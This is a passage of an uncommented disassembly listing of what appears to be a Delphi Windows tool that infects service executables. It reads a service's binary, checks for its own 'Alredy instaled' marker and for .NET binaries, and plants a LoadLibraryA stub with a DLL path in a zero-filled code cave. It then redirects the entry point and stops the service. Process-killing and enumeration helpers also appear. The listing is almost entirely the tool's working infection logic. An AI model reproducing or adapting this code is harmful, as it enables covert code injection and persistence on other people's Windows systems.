  004034D4: jmp     ds:__imp_QueryServiceStatus

Function: StartServiceA
  004034DC: jmp     ds:__imp_StartServiceA

Function: sub_4034E4
  004034E4: push    ebp
  004034E5: mov     ebp, esp
  004034E7: xor     eax, eax
  004034E9: push    ebp
  004034EA: push    offset loc_403509
  004034EF: push    dword ptr fs:[eax]
  004034F2: mov     fs:[eax], esp
  004034F5: inc     ds:dword_406664
  004034FB: xor     eax, eax
  004034FD: pop     edx
  004034FE: pop     ecx
  004034FF: pop     ecx
  00403500: mov     fs:[eax], edx
  00403503: push    offset loc_403510
  00403508: retn
  00403509: jmp     unknown_libname_39; BDS 2005-2007 and Delphi6-7 Visual Component Library
  0040350E: jmp     short loc_403508
  00403510: pop     ebp
  00403511: retn

Function: sub_403514
  00403514: sub     ds:dword_406664, 1
  0040351B: retn

Function: @TlHelp32@_16385
  0040351C: push    ebx
  0040351D: mov     ebx, offset unk_666C
  00403522: cmp     dword ptr [ebx], 0
  00403525: jnz     loc_403660
  0040352B: push    offset ModuleName; "kernel32.dll"
  00403530: call    GetModuleHandleA_0
  00403535: mov     [ebx], eax
  00403537: cmp     dword ptr [ebx], 0
  0040353A: jz      loc_403660
  00403540: push    offset ProcName; "CreateToolhelp32Snapshot"
  00403545: mov     eax, [ebx]
  00403547: push    eax; hModule
  00403548: call    GetProcAddress
  0040354D: mov     ds:dword_406670, eax
  00403552: push    offset aHeap32listfirs; "Heap32ListFirst"
  00403557: mov     eax, [ebx]
  00403559: push    eax; hModule
  0040355A: call    GetProcAddress
  0040355F: mov     ds:dword_406674, eax
  00403564: push    offset aHeap32listnext; "Heap32ListNext"
  00403569: mov     eax, [ebx]
  0040356B: push    eax; hModule
  0040356C: call    GetProcAddress
  00403571: mov     ds:dword_406678, eax
  00403576: push    offset aHeap32first; "Heap32First"
  0040357B: mov     eax, [ebx]
  0040357D: push    eax; hModule
  0040357E: call    GetProcAddress
  00403583: mov     ds:dword_40667C, eax
  00403588: push    offset aHeap32next; "Heap32Next"
  0040358D: mov     eax, [ebx]
  0040358F: push    eax; hModule
  00403590: call    GetProcAddress
  00403595: mov     ds:dword_406680, eax
  0040359A: push    offset aToolhelp32read; "Toolhelp32ReadProcessMemory"
  0040359F: mov     eax, [ebx]
  004035A1: push    eax; hModule
  004035A2: call    GetProcAddress
  004035A7: mov     ds:dword_406684, eax
  004035AC: push    offset aProcess32first; "Process32First"
  004035B1: mov     eax, [ebx]
  004035B3: push    eax; hModule
  004035B4: call    GetProcAddress
  004035B9: mov     ds:dword_406688, eax
  004035BE: push    offset aProcess32next; "Process32Next"
  004035C3: mov     eax, [ebx]
  004035C5: push    eax; hModule
  004035C6: call    GetProcAddress
  004035CB: mov     ds:dword_40668C, eax
  004035D0: push    offset aProcess32first_0; "Process32FirstW"
  004035D5: mov     eax, [ebx]
  004035D7: push    eax; hModule
  004035D8: call    GetProcAddress
  004035DD: mov     ds:dword_406690, eax
  004035E2: push    offset aProcess32nextw; "Process32NextW"
  004035E7: mov     eax, [ebx]
  004035E9: push    eax; hModule
  004035EA: call    GetProcAddress
  004035EF: mov     ds:dword_406694, eax
  004035F4: push    offset aThread32first; "Thread32First"
  004035F9: mov     eax, [ebx]
  004035FB: push    eax; hModule
  004035FC: call    GetProcAddress
  00403601: mov     ds:dword_406698, eax
  00403606: push    offset aThread32next; "Thread32Next"
  0040360B: mov     eax, [ebx]
  0040360D: push    eax; hModule
  0040360E: call    GetProcAddress
  00403613: mov     ds:dword_40669C, eax
  00403618: push    offset aModule32first; "Module32First"
  0040361D: mov     eax, [ebx]
  0040361F: push    eax; hModule
  00403620: call    GetProcAddress
  00403625: mov     ds:dword_4066A0, eax
  0040362A: push    offset aModule32next; "Module32Next"
  0040362F: mov     eax, [ebx]
  00403631: push    eax; hModule
  00403632: call    GetProcAddress
  00403637: mov     ds:dword_4066A4, eax
  0040363C: push    offset aModule32firstw; "Module32FirstW"
  00403641: mov     eax, [ebx]
  00403643: push    eax; hModule
  00403644: call    GetProcAddress
  00403649: mov     ds:dword_4066A8, eax
  0040364E: push    offset aModule32nextw; "Module32NextW"
  00403653: mov     eax, [ebx]
  00403655: push    eax; hModule
  00403656: call    GetProcAddress
  0040365B: mov     ds:dword_4066AC, eax
  00403660: cmp     dword ptr [ebx], 0
  00403663: jz      short loc_40366E
  00403665: cmp     ds:dword_406670, 0
  0040366C: jnz     short loc_403672
  0040366E: xor     eax, eax
  00403670: pop     ebx
  00403671: retn
  00403672: mov     al, 1
  00403674: pop     ebx
  00403675: retn

Function: unknown_libname_52
  00403798: push    ebx
  00403799: push    esi
  0040379A: mov     esi, edx
  0040379C: mov     ebx, eax
  0040379E: call    @TlHelp32@_16385; TlHelp32::_16385
  004037A3: test    al, al
  004037A5: jz      short loc_4037B2
  004037A7: push    esi
  004037A8: push    ebx
  004037A9: call    ds:dword_406670
  004037AF: pop     esi
  004037B0: pop     ebx
  004037B1: retn
  004037B2: xor     eax, eax
  004037B4: pop     esi
  004037B5: pop     ebx
  004037B6: retn

Function: unknown_libname_53
  004037B8: push    ebx
  004037B9: push    esi
  004037BA: mov     esi, edx
  004037BC: mov     ebx, eax
  004037BE: call    @TlHelp32@_16385; TlHelp32::_16385
  004037C3: test    al, al
  004037C5: jz      short loc_4037D2
  004037C7: push    esi
  004037C8: push    ebx
  004037C9: call    ds:dword_406688
  004037CF: pop     esi
  004037D0: pop     ebx
  004037D1: retn
  004037D2: xor     eax, eax
  004037D4: pop     esi
  004037D5: pop     ebx
  004037D6: retn

Function: unknown_libname_54
  004037D8: push    ebx
  004037D9: push    esi
  004037DA: mov     esi, edx
  004037DC: mov     ebx, eax
  004037DE: call    @TlHelp32@_16385; TlHelp32::_16385
  004037E3: test    al, al
  004037E5: jz      short loc_4037F2
  004037E7: push    esi
  004037E8: push    ebx
  004037E9: call    ds:dword_40668C
  004037EF: pop     esi
  004037F0: pop     ebx
  004037F1: retn
  004037F2: xor     eax, eax
  004037F4: pop     esi
  004037F5: pop     ebx
  004037F6: retn

Function: unknown_libname_55
  004037F8: push    ebx
  004037F9: push    esi
  004037FA: mov     esi, edx
  004037FC: mov     ebx, eax
  004037FE: call    @TlHelp32@_16385; TlHelp32::_16385
  00403803: test    al, al
  00403805: jz      short loc_403812
  00403807: push    esi
  00403808: push    ebx
  00403809: call    ds:dword_4066A0
  0040380F: pop     esi
  00403810: pop     ebx
  00403811: retn
  00403812: xor     eax, eax
  00403814: pop     esi
  00403815: pop     ebx
  00403816: retn

Function: unknown_libname_56
  00403818: push    ebx
  00403819: push    esi
  0040381A: mov     esi, edx
  0040381C: mov     ebx, eax
  0040381E: call    @TlHelp32@_16385; TlHelp32::_16385
  00403823: test    al, al
  00403825: jz      short loc_403832
  00403827: push    esi
  00403828: push    ebx
  00403829: call    ds:dword_4066A4
  0040382F: pop     esi
  00403830: pop     ebx
  00403831: retn
  00403832: xor     eax, eax
  00403834: pop     esi
  00403835: pop     ebx
  00403836: retn

Function: sub_403838
  00403838: push    ebp
  00403839: mov     ebp, esp
  0040383B: xor     eax, eax
  0040383D: push    ebp
  0040383E: push    offset loc_40385D
  00403843: push    dword ptr fs:[eax]
  00403846: mov     fs:[eax], esp
  00403849: inc     ds:dword_406668
  0040384F: xor     eax, eax
  00403851: pop     edx
  00403852: pop     ecx
  00403853: pop     ecx
  00403854: mov     fs:[eax], edx
  00403857: push    offset loc_403864
  0040385C: retn
  0040385D: jmp     unknown_libname_39; BDS 2005-2007 and Delphi6-7 Visual Component Library
  00403862: jmp     short loc_40385C
  00403864: pop     ebp
  00403865: retn

Function: sub_403868
  00403868: sub     ds:dword_406668, 1
  0040386F: retn

Function: sub_4039A0
  004039A0: push    ebx
  004039A1: push    esi
  004039A2: add     esp, 0FFFFFEFCh
  004039A8: mov     esi, ecx
  004039AA: mov     ebx, edx
  004039AC: mov     [esp+10Ch+String1], 0
  004039B1: test    eax, eax
  004039B3: jz      short loc_4039C0
  004039B5: push    eax; lpString2
  004039B6: lea     eax, [esp+110h+String1]
  004039BA: push    eax; lpString1
  004039BB: call    lstrcpyA
  004039C0: test    ebx, ebx
  004039C2: jz      short loc_4039DE
  004039C4: push    offset String2; " "
  004039C9: lea     eax, [esp+110h+String1]
  004039CD: push    eax; lpString1
  004039CE: call    lstrcatA
  004039D3: push    ebx; lpString2
  004039D4: lea     eax, [esp+110h+String1]
  004039D8: push    eax; lpString1
  004039D9: call    lstrcatA
  004039DE: test    esi, esi
  004039E0: jz      short loc_4039FC
  004039E2: push    offset String2; " "
  004039E7: lea     eax, [esp+110h+String1]
  004039EB: push    eax; lpString1
  004039EC: call    lstrcatA
  004039F1: push    esi; lpString2
  004039F2: lea     eax, [esp+110h+String1]
  004039F6: push    eax; lpString1
  004039F7: call    lstrcatA
  004039FC: push    0; Arguments
  004039FE: push    0; nSize
  00403A00: lea     eax, [esp+114h+Buffer]
  00403A04: push    eax; lpBuffer
  00403A05: push    0; dwLanguageId
  00403A07: call    GetLastError
  00403A0C: push    eax; dwMessageId
  00403A0D: push    0; lpSource
  00403A0F: push    1100h; dwFlags
  00403A14: call    FormatMessageA
  00403A19: push    40h ; '@'; uType
  00403A1B: lea     eax, [esp+110h+String1]
  00403A1F: push    eax; lpCaption
  00403A20: mov     eax, dword ptr [esp+114h+Buffer]
  00403A24: push    eax; lpText
  00403A25: push    0; hWnd
  00403A27: call    MessageBoxA_0
  00403A2C: mov     eax, dword ptr [esp+10Ch+Buffer]
  00403A2F: push    eax; hMem
  00403A30: call    LocalFree_0
  00403A35: add     esp, 104h
  00403A3B: pop     esi
  00403A3C: pop     ebx
  00403A3D: retn

Function: sub_403A44
  00403A44: push    ebx
  00403A45: push    esi
  00403A46: xor     ebx, ebx
  00403A48: push    eax; dwProcessId
  00403A49: push    0; bInheritHandle
  00403A4B: push    1; dwDesiredAccess
  00403A4D: call    OpenProcess
  00403A52: mov     esi, eax
  00403A54: cmp     esi, 0FFFFFFFFh
  00403A57: jz      short loc_403A78
  00403A59: push    1; uExitCode
  00403A5B: push    esi; hProcess
  00403A5C: call    TerminateProcess
  00403A61: cmp     eax, 1
  00403A64: sbb     ebx, ebx
  00403A66: inc     ebx
  00403A67: push    1388h; dwMilliseconds
  00403A6C: push    esi; hHandle
  00403A6D: call    WaitForSingleObject
  00403A72: push    esi; hObject
  00403A73: call    CloseHandle
  00403A78: mov     eax, ebx
  00403A7A: pop     esi
  00403A7B: pop     ebx
  00403A7C: retn

Function: sub_403A80
  00403A80: push    ebx
  00403A81: push    esi
  00403A82: push    edi
  00403A83: push    ecx
  00403A84: mov     edi, edx
  00403A86: xor     ebx, ebx
  00403A88: push    0; hTemplateFile
  00403A8A: push    0; dwFlagsAndAttributes
  00403A8C: push    3; dwCreationDisposition
  00403A8E: push    0; lpSecurityAttributes
  00403A90: push    1; dwShareMode
  00403A92: push    80000000h; dwDesiredAccess
  00403A97: push    eax; lpFileName
  00403A98: call    CreateFileA
  00403A9D: mov     esi, eax
  00403A9F: cmp     esi, 0FFFFFFFFh
  00403AA2: jz      short loc_403AF8
  00403AA4: push    0; lpFileSizeHigh
  00403AA6: push    esi; hFile
  00403AA7: call    GetFileSize
  00403AAC: mov     ebx, eax
  00403AAE: test    ebx, ebx
  00403AB0: jz      short loc_403AF2
  00403AB2: push    ebx; uBytes
  00403AB3: push    0; uFlags
  00403AB5: call    LocalAlloc_1
  00403ABA: mov     [edi], eax
  00403ABC: cmp     dword ptr [edi], 0
  00403ABF: jz      short loc_403AF0
  00403AC1: push    0; lpOverlapped
  00403AC3: lea     eax, [esp+14h+NumberOfBytesRead]
  00403AC7: push    eax; lpNumberOfBytesRead
  00403AC8: push    ebx; nNumberOfBytesToRead
  00403AC9: mov     eax, [edi]
  00403ACB: push    eax; lpBuffer
  00403ACC: push    esi; hFile
  00403ACD: call    ReadFile
  00403AD2: mov     eax, ebx
  00403AD4: cdq
  00403AD5: push    edx
  00403AD6: push    eax
  00403AD7: mov     eax, [esp+18h+NumberOfBytesRead]
  00403ADB: xor     edx, edx
  00403ADD: cmp     edx, [esp+18h+var_14]
  00403AE1: jnz     short loc_403AE6
  00403AE3: cmp     eax, [esp+18h+var_18]
  00403AE6: pop     edx
  00403AE7: pop     eax
  00403AE8: jz      short loc_403AF2
  00403AEA: push    ebx; hMem
  00403AEB: call    LocalFree_0
  00403AF0: xor     ebx, ebx
  00403AF2: push    esi; hObject
  00403AF3: call    CloseHandle
  00403AF8: mov     eax, ebx
  00403AFA: pop     edx
  00403AFB: pop     edi
  00403AFC: pop     esi
  00403AFD: pop     ebx
  00403AFE: retn

Function: sub_403B00
  00403B00: push    esi
  00403B01: push    edi
  00403B02: push    ebp
  00403B03: mov     ecx, [eax+74h]
  00403B06: lea     edi, [eax+ecx*8+78h]
  00403B0A: movzx   ecx, word ptr [eax+6]
  00403B0E: dec     ecx
  00403B0F: test    ecx, ecx
  00403B11: jl      short loc_403B2E
  00403B13: inc     ecx
  00403B14: xor     esi, esi
  00403B16: lea     eax, [esi+esi*4]
  00403B19: lea     eax, [edi+eax*8]
  00403B1C: mov     ebp, [eax+0Ch]
  00403B1F: cmp     edx, ebp
  00403B21: jb      short loc_403B2A
  00403B23: add     ebp, [eax+10h]
  00403B26: cmp     edx, ebp
  00403B28: jb      short loc_403B31
  00403B2A: inc     esi
  00403B2B: dec     ecx
  00403B2C: jnz     short loc_403B16
  00403B2E: or      esi, 0FFFFFFFFh
  00403B31: mov     eax, esi
  00403B33: pop     ebp
  00403B34: pop     edi
  00403B35: pop     esi
  00403B36: retn

Function: sub_403B38
  00403B38: push    ebx
  00403B39: push    esi
  00403B3A: push    edi
  00403B3B: push    ecx
  00403B3C: mov     [esp+10h+var_10], edx
  00403B3F: mov     esi, eax
  00403B41: mov     eax, esi
  00403B43: mov     eax, [eax+3Ch]
  00403B46: lea     ebx, [esi+eax]
  00403B49: mov     eax, [ebx+74h]
  00403B4C: lea     edi, [ebx+eax*8+78h]
  00403B50: mov     eax, ebx
  00403B52: mov     edx, [ebx+80h]
  00403B58: call    sub_403B00
  00403B5D: lea     edx, [eax+eax*4]
  00403B60: mov     edx, [edi+edx*8+0Ch]
  00403B64: lea     eax, [eax+eax*4]
  00403B67: sub     edx, [edi+eax*8+14h]
  00403B6B: mov     eax, [esp+10h+var_10]
  00403B6E: mov     [eax], edx
  00403B70: mov     eax, [esp+10h+var_10]
  00403B73: mov     edx, [ebx+80h]
  00403B79: sub     edx, [eax]
  00403B7B: lea     eax, [esi+edx]
  00403B7E: pop     edx
  00403B7F: pop     edi
  00403B80: pop     esi
  00403B81: pop     ebx
  00403B82: retn

Function: sub_403B84
  00403B84: push    12345678h
  00403B89: push    12345678h
  00403B8E: mov     eax, 0
  00403B93: call    eax
  00403B95: retn

Function: nullsub_1
  00403B98: retn

Function: sub_403B9C
  00403B9C: push    ebx
  00403B9D: push    esi
  00403B9E: push    edi
  00403B9F: push    ebp
  00403BA0: add     esp, 0FFFFFFE0h
  00403BA3: mov     [esp+30h+lpString2], edx
  00403BA6: mov     ebx, eax
  00403BA8: mov     [esp+30h+var_2C], 0
  00403BAD: mov     eax, ebx
  00403BAF: mov     eax, [eax+3Ch]
  00403BB2: lea     edi, [ebx+eax]
  00403BB5: mov     eax, [edi+74h]
  00403BB8: lea     eax, [edi+eax*8+78h]
  00403BBC: mov     [esp+30h+var_24], eax
  00403BC0: mov     edx, [edi+28h]
  00403BC3: mov     eax, edi
  00403BC5: call    sub_403B00
  00403BCA: mov     [esp+30h+var_20], eax
  00403BCE: mov     eax, [esp+30h+var_20]
  00403BD2: lea     eax, [eax+eax*4]
  00403BD5: mov     edx, [esp+30h+var_24]
  00403BD9: mov     eax, [edx+eax*8+0Ch]
  00403BDD: mov     edx, [esp+30h+var_20]
  00403BE1: lea     edx, [edx+edx*4]
  00403BE4: mov     ecx, [esp+30h+var_24]
  00403BE8: sub     eax, [ecx+edx*8+14h]
  00403BEC: mov     [esp+30h+var_28], eax
  00403BF0: mov     eax, [esp+30h+var_20]
  00403BF4: lea     eax, [eax+eax*4]
  00403BF7: mov     edx, [esp+30h+var_24]
  00403BFB: mov     eax, [edx+eax*8+14h]
  00403BFF: mov     [esp+30h+var_1C], eax
  00403C03: xor     eax, eax
  00403C05: xor     edx, edx
  00403C07: mov     [esp+30h+var_18], edx
  00403C0B: xor     esi, esi
  00403C0D: xor     edx, edx
  00403C0F: mov     [esp+30h+var_14], edx
  00403C13: mov     edx, [esp+30h+var_1C]
  00403C17: mov     ecx, [esp+30h+var_20]
  00403C1B: lea     ecx, [ecx+ecx*4]
  00403C1E: mov     ebp, [esp+30h+var_24]
  00403C22: mov     ecx, [ebp+ecx*8+10h]
  00403C26: add     ecx, [esp+30h+var_1C]
  00403C2A: dec     ecx
  00403C2B: sub     ecx, edx
  00403C2D: jl      short loc_403C55
  00403C2F: inc     ecx
  00403C30: cmp     byte ptr [ebx+edx], 0
  00403C34: jnz     short loc_403C41
  00403C36: test    eax, eax
  00403C38: jnz     short loc_403C3E
  00403C3A: mov     [esp+30h+var_14], edx
  00403C3E: inc     eax
  00403C3F: jmp     short loc_403C51
  00403C41: cmp     eax, [esp+30h+var_18]
  00403C45: jbe     short loc_403C4F
  00403C47: mov     [esp+30h+var_18], eax
  00403C4B: mov     esi, [esp+30h+var_14]
  00403C4F: xor     eax, eax
  00403C51: inc     edx
  00403C52: dec     ecx
  00403C53: jnz     short loc_403C30
  00403C55: cmp     eax, [esp+30h+var_18]
  00403C59: jbe     short loc_403C5F
  00403C5B: mov     esi, [esp+30h+var_14]
  00403C5F: add     esi, 3
  00403C62: mov     ebp, offset nullsub_1
  00403C67: sub     ebp, offset sub_403B84
  00403C6D: mov     edx, offset sub_403B84
  00403C72: lea     eax, [ebx+esi]
  00403C75: mov     ecx, ebp
  00403C77: call    sub_40346C
  00403C7C: mov     eax, [esp+30h+lpString2]
  00403C7F: push    eax; lpString2
  00403C80: lea     eax, [ebp+esi+0]
  00403C84: lea     eax, [ebx+eax]
  00403C87: push    eax; lpString1
  00403C88: call    lstrcpyA
  00403C8D: mov     eax, [edi+28h]
  00403C90: add     eax, [edi+34h]
  00403C93: lea     edx, [ebx+esi+1]
  00403C97: mov     [edx], eax
  00403C99: mov     eax, [edi+34h]
  00403C9C: add     eax, [esp+30h+var_28]
  00403CA0: add     eax, esi
  00403CA2: add     ebp, eax
  00403CA4: lea     eax, [ebx+esi+6]
  00403CA8: mov     [eax], ebp
  00403CAA: push    offset aLoadlibrarya; "LoadLibraryA"
  00403CAF: push    offset aKernel32; "kernel32"
  00403CB4: call    GetModuleHandleA_0
  00403CB9: push    eax; hModule
  00403CBA: call    GetProcAddress
  00403CBF: lea     edx, [ebx+esi+0Bh]
  00403CC3: mov     [edx], eax
  00403CC5: add     esi, [esp+30h+var_28]
  00403CC9: mov     [edi+28h], esi
  00403CCC: mov     al, [esp+30h+var_2C]
  00403CD0: add     esp, 20h
  00403CD3: pop     ebp
  00403CD4: pop     edi
  00403CD5: pop     esi
  00403CD6: pop     ebx
  00403CD7: retn

Function: sub_403CF4
  00403CF4: push    ebx
  00403CF5: push    esi
  00403CF6: push    edi
  00403CF7: push    ebp
  00403CF8: push    ecx
  00403CF9: mov     [esp+14h+nNumberOfBytesToWrite], ecx
  00403CFC: mov     ebp, edx
  00403CFE: mov     edi, eax
  00403D00: mov     esi, 32h ; '2'
  00403D05: push    0; hTemplateFile
  00403D07: push    0; dwFlagsAndAttributes
  00403D09: push    2; dwCreationDisposition
  00403D0B: push    0; lpSecurityAttributes
  00403D0D: push    1; dwShareMode
  00403D0F: push    40000000h; dwDesiredAccess
  00403D14: push    edi; lpFileName
  00403D15: call    CreateFileA
  00403D1A: mov     ebx, eax
  00403D1C: test    ebx, ebx
  00403D1E: jg      short loc_403D3C
  00403D20: push    64h ; 'd'; dwMilliseconds
  00403D22: call    Sleep
  00403D27: dec     esi
  00403D28: test    esi, esi
  00403D2A: jg      short loc_403D05
  00403D2C: mov     eax, offset aCreatefileWr; "CreateFile (wr) "
  00403D31: xor     ecx, ecx; LPCSTR
  00403D33: xor     edx, edx; LPCSTR
  00403D35: call    sub_4039A0
  00403D3A: jmp     short loc_403D55
  00403D3C: push    0; lpOverlapped
  00403D3E: lea     eax, [esp+18h+nNumberOfBytesToWrite]
  00403D42: push    eax; lpNumberOfBytesWritten
  00403D43: mov     eax, [esp+1Ch+nNumberOfBytesToWrite]
  00403D47: push    eax; nNumberOfBytesToWrite
  00403D48: push    ebp; lpBuffer
  00403D49: push    ebx; hFile
  00403D4A: call    WriteFile_0
  00403D4F: push    ebx; hObject
  00403D50: call    CloseHandle
  00403D55: pop     edx
  00403D56: pop     ebp
  00403D57: pop     edi
  00403D58: pop     esi
  00403D59: pop     ebx
  00403D5A: retn

Function: sub_403D70
  00403D70: push    ebx
  00403D71: push    esi
  00403D72: push    edi
  00403D73: add     esp, 0FFFFFFE4h
  00403D76: mov     edi, eax
  00403D78: xor     ebx, ebx
  00403D7A: call    GetTickCount
  00403D7F: mov     esi, eax
  00403D81: add     esi, 7530h
  00403D87: push    esp; lpServiceStatus
  00403D88: push    edi; hService
  00403D89: call    QueryServiceStatus
  00403D8E: test    eax, eax
  00403D90: jnz     short loc_403DA2
  00403D92: mov     eax, offset aQueryservicest; "QueryServiceStatus"
  00403D97: xor     ecx, ecx; LPCSTR
  00403D99: xor     edx, edx; LPCSTR
  00403D9B: call    sub_4039A0
  00403DA0: jmp     short loc_403DCA
  00403DA2: cmp     [esp+28h+var_24], 1
  00403DA7: setz    bl
  00403DAA: test    bl, bl
  00403DAC: jz      short loc_403DBA
  00403DAE: push    3E8h; dwMilliseconds
  00403DB3: call    Sleep
  00403DB8: jmp     short loc_403DD8
  00403DBA: push    64h ; 'd'; dwMilliseconds
  00403DBC: call    Sleep
  00403DC1: call    GetTickCount
  00403DC6: cmp     esi, eax
  00403DC8: ja      short loc_403D87
  00403DCA: mov     eax, offset aWaitStopServic; "Wait Stop Service TimeOut "
  00403DCF: xor     ecx, ecx; LPCSTR
  00403DD1: xor     edx, edx; LPCSTR
  00403DD3: call    sub_4039A0
  00403DD8: mov     eax, ebx
  00403DDA: add     esp, 1Ch
  00403DDD: pop     edi
  00403DDE: pop     esi
  00403DDF: pop     ebx
  00403DE0: retn

Function: sub_403E14
  00403E14: push    ebx
  00403E15: push    esi
  00403E16: push    edi
  00403E17: push    ecx
  00403E18: mov     esi, eax
  00403E1A: mov     [esp+10h+var_10], 0
  00403E1E: mov     eax, esi
  00403E20: mov     eax, [eax+3Ch]
  00403E23: lea     ebx, [esi+eax]
  00403E26: mov     eax, [ebx+74h]
  00403E29: lea     edi, [ebx+eax*8+78h]
  00403E2D: mov     eax, ebx
  00403E2F: mov     edx, [ebx+28h]
  00403E32: call    sub_403B00
  00403E37: lea     edx, [eax+eax*4]
  00403E3A: mov     edx, [edi+edx*8+0Ch]
  00403E3E: lea     eax, [eax+eax*4]
  00403E41: sub     edx, [edi+eax*8+14h]
  00403E45: mov     eax, edx
  00403E47: mov     edx, [ebx+28h]
  00403E4A: sub     edx, eax
  00403E4C: cmp     byte ptr [esi+edx], 68h ; 'h'
  00403E50: jnz     short loc_403E5D
  00403E52: cmp     byte ptr [esi+edx+5], 68h ; 'h'
  00403E57: jnz     short loc_403E5D
  00403E59: mov     [esp+10h+var_10], 1
  00403E5D: mov     al, [esp+10h+var_10]
  00403E60: pop     edx
  00403E61: pop     edi
  00403E62: pop     esi
  00403E63: pop     ebx
  00403E64: retn

Function: sub_403E68
  00403E68: push    ebx
  00403E69: push    esi
  00403E6A: push    edi
  00403E6B: push    ecx
  00403E6C: mov     esi, eax
  00403E6E: mov     bl, 1
  00403E70: mov     edx, esp
  00403E72: mov     eax, esi
  00403E74: call    sub_403B38
  00403E79: mov     edi, eax
  00403E7B: jmp     short loc_403E99
  00403E7D: push    offset aMscoreeDll; "MSCOREE.DLL"
  00403E82: mov     eax, [edi+0Ch]
  00403E85: sub     eax, [esp+14h+var_10]
  00403E89: lea     eax, [esi+eax]
  00403E8C: push    eax; lpString1
  00403E8D: call    lstrcmpiA
  00403E92: test    eax, eax
  00403E94: jz      short loc_403EA6
  00403E96: add     edi, 14h
  00403E99: cmp     dword ptr [edi], 0
  00403E9C: jnz     short loc_403E7D
  00403E9E: cmp     dword ptr [edi+10h], 0
  00403EA2: jnz     short loc_403E7D
  00403EA4: xor     ebx, ebx
  00403EA6: mov     eax, ebx
  00403EA8: pop     edx
  00403EA9: pop     edi
  00403EAA: pop     esi
  00403EAB: pop     ebx
  00403EAC: retn

Function: sub_403EBC
  00403EBC: push    ebx
  00403EBD: push    esi
  00403EBE: push    edi
  00403EBF: push    ebp
  00403EC0: add     esp, 0FFFFFBCCh
  00403EC6: mov     [esp+444h+var_440], dl
  00403ECA: mov     [esp+444h+lpServiceName], eax
  00403ECD: xor     ebx, ebx
  00403ECF: push    1; dwDesiredAccess
  00403ED1: push    0; lpDatabaseName
  00403ED3: push    0; lpMachineName
  00403ED5: call    OpenSCManagerA
  00403EDA: mov     edi, eax
  00403EDC: test    edi, edi
  00403EDE: jnz     short loc_403EF3
  00403EE0: mov     eax, offset aOpenscmanager; "OpenSCManager"
  00403EE5: xor     ecx, ecx; LPCSTR
  00403EE7: xor     edx, edx; LPCSTR
  00403EE9: call    sub_4039A0
  00403EEE: jmp     loc_4041B0
  00403EF3: push    2000000h; dwDesiredAccess
  00403EF8: mov     eax, [esp+448h+lpServiceName]
  00403EFC: push    eax; lpServiceName
  00403EFD: push    edi; hSCManager
  00403EFE: call    OpenServiceA
  00403F03: mov     esi, eax
  00403F05: test    esi, esi
  00403F07: jnz     short loc_403F1D
  00403F09: mov     eax, offset aOpenservice; "OpenService"
  00403F0E: xor     ecx, ecx; LPCSTR
  00403F10: mov     edx, [esp+444h+lpServiceName]; LPCSTR
  00403F13: call    sub_4039A0
  00403F18: jmp     loc_4041AA
  00403F1D: lea     eax, [esp+444h+pcbBytesNeeded]
  00403F21: push    eax; pcbBytesNeeded
  00403F22: push    200h; cbBufSize
  00403F27: lea     eax, [esp+44Ch+ServiceConfig]
  00403F2B: push    eax; lpServiceConfig
  00403F2C: push    esi; hService
  00403F2D: call    QueryServiceConfigA
  00403F32: test    eax, eax
  00403F34: jnz     short loc_403F4A
  00403F36: mov     eax, offset aQueryserviceco; "QueryServiceConfig "
  00403F3B: xor     ecx, ecx; LPCSTR
  00403F3D: mov     edx, [esp+444h+lpServiceName]; LPCSTR
  00403F40: call    sub_4039A0
  00403F45: jmp     loc_4041AA
  00403F4A: lea     ebp, [esp+444h+ServiceConfig]
  00403F4E: mov     eax, [ebp+0Ch]
  00403F51: cmp     byte ptr [eax], 22h ; '"'
  00403F54: jnz     short loc_403F59
  00403F56: inc     dword ptr [ebp+0Ch]
  00403F59: mov     eax, [ebp+0Ch]
  00403F5C: push    eax; lpString
  00403F5D: call    lstrlenA
  00403F62: mov     [esp+444h+pcbBytesNeeded], eax
  00403F66: mov     eax, [ebp+0Ch]
  00403F69: mov     edx, [esp+444h+pcbBytesNeeded]
  00403F6D: cmp     byte ptr [eax+edx-1], 22h ; '"'
  00403F72: jnz     short loc_403F7D
  00403F74: mov     edx, [esp+444h+pcbBytesNeeded]
  00403F78: mov     byte ptr [eax+edx-1], 0
  00403F7D: mov     eax, [ebp+0Ch]
  00403F80: push    eax; lpString2
  00403F81: lea     eax, [esp+448h+String1]
  00403F88: push    eax; lpString1
  00403F89: call    lstrcpyA
  00403F8E: push    offset asc_41F0; ":"
  00403F93: lea     eax, [esp+448h+String1]
  00403F9A: push    eax; lpString1
  00403F9B: call    lstrcatA
  00403FA0: mov     eax, ds:lpString2
  00403FA5: push    eax; lpString2
  00403FA6: lea     eax, [esp+448h+String1]
  00403FAD: push    eax; lpString1
  00403FAE: call    lstrcatA
  00403FB3: mov     al, [esp+444h+var_440]
  00403FB7: sub     al, 1
  00403FB9: jb      loc_40410D
  00403FBF: jz      short loc_403FC6
  00403FC1: jmp     loc_4041A4
  00403FC6: lea     edx, [esp+444h+hMem]
  00403FCA: mov     eax, [ebp+0Ch]; lpFileName
  00403FCD: call    sub_403A80
  00403FD2: mov     [esp+444h+var_434], eax
  00403FD6: cmp     [esp+444h+var_434], 0
  00403FDB: jg      short loc_403FF1
  00403FDD: mov     eax, offset aLoadfile; "LoadFile "
  00403FE2: xor     ecx, ecx; LPCSTR
  00403FE4: mov     edx, [ebp+0Ch]; LPCSTR
  00403FE7: call    sub_4039A0
  00403FEC: jmp     loc_4041A4
  00403FF1: mov     eax, [esp+444h+hMem]
  00403FF5: call    sub_403E14
  00403FFA: test    al, al
  00403FFC: jz      short loc_404020
  00403FFE: push    0; uType
  00404000: push    offset aError_0; "Error"
  00404005: push    offset aAlredyInstaled; "Alredy instaled"
  0040400A: push    0; hWnd
  0040400C: call    MessageBoxA_0
  00404011: mov     eax, [esp+444h+hMem]
  00404015: push    eax; hMem
  00404016: call    LocalFree_0
  0040401B: jmp     loc_4040CF
  00404020: mov     eax, [esp+444h+hMem]
  00404024: call    sub_403E68
  00404029: test    al, al
  0040402B: jz      short loc_40404F
  0040402D: push    0; uType
  0040402F: push    offset aError_0; "Error"
  00404034: push    offset aMscoreDllInImp; "mscore.dll in import"
  00404039: push    0; hWnd
  0040403B: call    MessageBoxA_0
  00404040: mov     eax, [esp+444h+hMem]
  00404044: push    eax; hMem
  00404045: call    LocalFree_0
  0040404A: jmp     loc_4041A4
  0040404F: lea     edx, [esp+444h+String1]
  00404056: mov     eax, [esp+444h+hMem]
  0040405A: call    sub_403B9C
  0040405F: lea     eax, [esp+444h+ServiceStatus]
  00404063: push    eax; lpServiceStatus
  00404064: push    1; dwControl
  00404066: push    esi; hService
  00404067: call    ControlService
  0040406C: test    eax, eax
